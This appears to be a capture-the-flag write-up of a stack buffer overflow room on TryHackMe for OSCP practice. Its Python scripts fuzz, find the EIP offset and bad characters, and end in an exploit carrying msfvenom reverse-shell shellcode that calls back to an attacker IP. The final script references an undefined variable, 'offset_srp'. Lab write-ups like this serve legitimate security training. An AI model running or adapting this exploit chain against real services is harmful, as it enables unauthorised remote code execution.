# THM-OSCP-BoF-1

## Purpose
There are several ways to skin the cat, and ultimately it comes down to what works best for you and what method best works for you. I'll be walking through my process of exploiting development and doing this against [TryHackMe's BoF 1](https://tryhackme.com/room/bof1) room. 

### Script Overview
- THM Fuzzing script
- My Exploit Dev Scripts
	- 1-ver.py
	- 2-eipOverwrite.py
	- 3-badChars.py
	- 4-Final-Exploit

* * *

## Identify the crash value
To identify the crash value of the program, we'll have to run the following script below. 


<details>
  <summary>THM Fuzzing script</summary>

```python
import socket, time, sys

ip = "10.10.232.91"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```
</details>


**crash point**
```shell
$ python fuzzer.py 
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
```
* * *

# My Exploit Dev Scripts
After the fuzzing script identified the crash value, we can now plug that value into the PoC script and test to see if it crashes at 2000 bytes. Afterward, we'll generate 2000 random characters and place them into our code to figure out the offset using the number referenced in EIP after we crashed the program. 

**Script 1**
Run through the following steps
```bash
$ python 1-fuzz-ran.py 
$ msf-pattern_create -l 2000 > pat.txt
$ leafpad pat.txt 

#open pat.txt to copy the contents of it to paste into script 1's buf variable

$ python 1-fuzz-ran.py
#EIP should have changed in mona and now figure out the offset valu
```

<details>
  <summary>Script 1 </summary>

```python
#!/usr/bin/python

import socket

RHOST = "10.10.232.91"  #Target IP

RPORT = 1337	   #Target Port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((RHOST, RPORT))

#"A" * 2000

buf = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
#"A" * 2000

s.send("OVERFLOW1 " + buf)
s.recv(1024)
s.close()
```
</details>

**Mona**

After we send the exploit with the random characters as the buffer, verify the mona's EIP block. That value should have changed, and we will use that value to figure out what the exploit's offset will be.

![EIP Mona](https://github.com/hxhBrofessor/THM-OSCP-BoF/blob/main/image/1.JPG)

**Offset**
```bash
$ msf-pattern_offset -q 6F43396E
[*] Exact match at offset 1978
```

## Control EIP

Now that we have offset for our exploit, we'll test and see if we can control EIP by sending for four Bs, which is **`42424242`** in hex.

<details>
  <summary>script2</summary>

```python
#!/usr/bin/python
import socket

RHOST = "10.10.232.91"  #Target IP
RPORT = 1337	   #Target Port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))


buf = "A" * 1978 + "B" * 4 

s.send("OVERFLOW1 " + buf)
s.recv(1024)
s.close()
```
</details>

We can successfully control EIP.

![Control EIP ](https://github.com/hxhBrofessor/THM-OSCP-BoF/blob/main/image/2.JPG)


## BadChars

Once those steps are complete, run script number 3. 

```python
#Generates workin directory
!mona config -set workingfolder c:\mona\%p

#Generate bad character array **NOTE** `x00` is always a bad character
!mona bytearray -cpb \x00
```

<details>
  <summary>script 3</summary>

```python
#!/usr/bin/python
import socket

RHOST = "10.10.232.91"  #Target IP
RPORT = 1337	   #Target Port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"
"\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
"\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
"\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"
"\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"
"\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buf = "A" * 1978 + "B" * 4 + badchars

s.send("OVERFLOW1 " + buf)
s.recv(1024)
s.close()
```
</details>

Verify the bad characters using the following mona syntax.

```python
!mona compare -a esp -f C:\mona\oscp\bytearray.bin
```

#### Result
**identified bad chars**
result: 00 07 08 2e 2f a0 a1

![Bad Char Result](https://github.com/hxhBrofessor/THM-OSCP-BoF/blob/main/image/3.JPG)


## Finding our JMP ESP
To find JMP ESP of the program, in MONA run the following comamnds below.
```python
!mona modules
!mona jmp -r esp -cpb \x00
#clicked the first one that met all off the conditions required and followed in to dissasembler
```

![JMP ESP](https://github.com/hxhBrofessor/THM-OSCP-BoF/blob/main/image/4.JPG)

convert result to little endian
```bash
result = 625011AF   FFE4             JMP ESP
"\x62\x50\x11\xAF"
"\xAF\x11\x50\x62"
```

# final
Putting it all togther.
- exclude the identified bad characters from payload 
- add our jmp esp
- add the nops

```bash
 "\x00\x07\x08\x2e\x2f\xa0\xa1"
msfvenom -p windows/shell_reverse_tcp LHOST=10.2.35.207 LPORT=443 EXITFUNC=thread -f c -a x86 -b  "\x00\x07\x08\x2e\x2f\xa0\xa1"

set nc litener up
```

<details>
  <summary>final</summary>

```python
#!/usr/bin/python
import socket

RHOST = "10.10.232.91"  #Target IP
RPORT = 1337	   #Target Port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

shellcode = ("\xd9\xcb\xb8\x1e\xb1\x35\x97\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x83\xc7\x04\x31\x47\x13\x03\x59\xa2\xd7\x62\x99\x2c\x95"
"\x8d\x61\xad\xfa\x04\x84\x9c\x3a\x72\xcd\x8f\x8a\xf0\x83\x23"
"\x60\x54\x37\xb7\x04\x71\x38\x70\xa2\xa7\x77\x81\x9f\x94\x16"
"\x01\xe2\xc8\xf8\x38\x2d\x1d\xf9\x7d\x50\xec\xab\xd6\x1e\x43"
"\x5b\x52\x6a\x58\xd0\x28\x7a\xd8\x05\xf8\x7d\xc9\x98\x72\x24"
"\xc9\x1b\x56\x5c\x40\x03\xbb\x59\x1a\xb8\x0f\x15\x9d\x68\x5e"
"\xd6\x32\x55\x6e\x25\x4a\x92\x49\xd6\x39\xea\xa9\x6b\x3a\x29"
"\xd3\xb7\xcf\xa9\x73\x33\x77\x15\x85\x90\xee\xde\x89\x5d\x64"
"\xb8\x8d\x60\xa9\xb3\xaa\xe9\x4c\x13\x3b\xa9\x6a\xb7\x67\x69"
"\x12\xee\xcd\xdc\x2b\xf0\xad\x81\x89\x7b\x43\xd5\xa3\x26\x0c"
"\x1a\x8e\xd8\xcc\x34\x99\xab\xfe\x9b\x31\x23\xb3\x54\x9c\xb4"
"\xb4\x4e\x58\x2a\x4b\x71\x99\x63\x88\x25\xc9\x1b\x39\x46\x82"
"\xdb\xc6\x93\x05\x8b\x68\x4c\xe6\x7b\xc9\x3c\x8e\x91\xc6\x63"
"\xae\x9a\x0c\x0c\x45\x61\xc7\x39\x98\x4a\xd8\x56\x9e\x8c\xe7"
"\x1d\x17\x6a\x8d\x71\x7e\x25\x3a\xeb\xdb\xbd\xdb\xf4\xf1\xb8"
"\xdc\x7f\xf6\x3d\x92\x77\x73\x2d\x43\x78\xce\x0f\xc2\x87\xe4"
"\x27\x88\x1a\x63\xb7\xc7\x06\x3c\xe0\x80\xf9\x35\x64\x3d\xa3"
"\xef\x9a\xbc\x35\xd7\x1e\x1b\x86\xd6\x9f\xee\xb2\xfc\x8f\x36"
"\x3a\xb9\xfb\xe6\x6d\x17\x55\x41\xc4\xd9\x0f\x1b\xbb\xb3\xc7"
"\xda\xf7\x03\x91\xe2\xdd\xf5\x7d\x52\x88\x43\x82\x5b\x5c\x44"
"\xfb\x81\xfc\xab\xd6\x01\x1c\x4e\xf2\x7f\xb5\xd7\x97\x3d\xd8"
"\xe7\x42\x01\xe5\x6b\x66\xfa\x12\x73\x03\xff\x5f\x33\xf8\x8d"
"\xf0\xd6\xfe\x22\xf0\xf2")

offset = 1978
jmp_esp = "\xAF\x11\x50\x62"
nops = "\x90" * 32

buf= "" 
buf += "A" * (offset_srp - len(buf))
buf += jmp_esp
buf += nops
buf += shellcode
buf += "\n"


# another method in running the exploit
#buf = "A" * 1978 + "\xAF\x11\x50\x62" + "\x90" * 32 + shellcode

s.send("OVERFLOW1 " + buf)
s.recv(1024)
s.close()
```
</details>

## proof

![Bam](https://github.com/hxhBrofessor/THM-OSCP-BoF/blob/main/image/5.JPG)
